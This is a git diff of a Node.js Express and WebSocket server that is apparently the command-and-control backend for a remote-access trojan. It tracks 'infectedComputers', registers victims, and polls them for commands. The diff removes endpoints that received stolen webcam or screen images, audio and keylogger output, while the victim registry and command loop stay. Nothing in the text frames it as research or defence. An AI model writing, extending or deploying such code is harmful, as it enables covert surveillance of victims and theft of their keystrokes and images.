@@ -1,19 +1,13 @@
 const WebSocket = require('ws');
 const express = require('express');
 const http = require('http');
-const bodyParser = require('body-parser');
-const fs = require('fs');
-const path = require("path")
 
 const app = express();
 
 app.use(express.urlencoded({ extended: true }));
-app.use(bodyParser.json({ limit: '10mb' }));
 
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
-const imagesDirectory = path.join(__dirname, 'images');
-app.use('/images', express.static(imagesDirectory));
 
 
 let infectedComputers = [
@@ -86,7 +80,7 @@ app.get("/response", (req, res)=>{
         res.send(response)
         response = "Wating for command"
         }else{
-            res.send("Wating for command")
+            res.send("Wating for response")
         }
     }, 1000)
 })
@@ -106,35 +100,6 @@ app.post("/register", (req, res)=>{
         console.log("User already registerd")
     }
     res.sendStatus(200)
-})
-
-app.post("/pics", (req, res) => {
-    const { pics } = req.body;
-    if (!pics) {
-        return res.status(400).send("No image data provided.");
-    }
-
-    const buffer = Buffer.from(pics, 'base64');
-
-    if (!fs.existsSync(imagesDirectory)) {
-        fs.mkdirSync(imagesDirectory);
-    }
-    const imageName = `image_${Date.now()}.jpg`
-    const filePath = path.join(imagesDirectory, imageName);
-    fs.writeFile(filePath, buffer, (err) => {
-        if (err) {
-            return res.status(500).send("Error saving image.");
-        }
-        res.status(200).send(`images/${imageName}`);
-    });
-});
-
-app.post("/audio", (req, res)=>{
-
-})
-
-app.post("/keylog", (req, res)=>{
-    response = req.body.logs
 })
 
 server.listen(5000, () => {
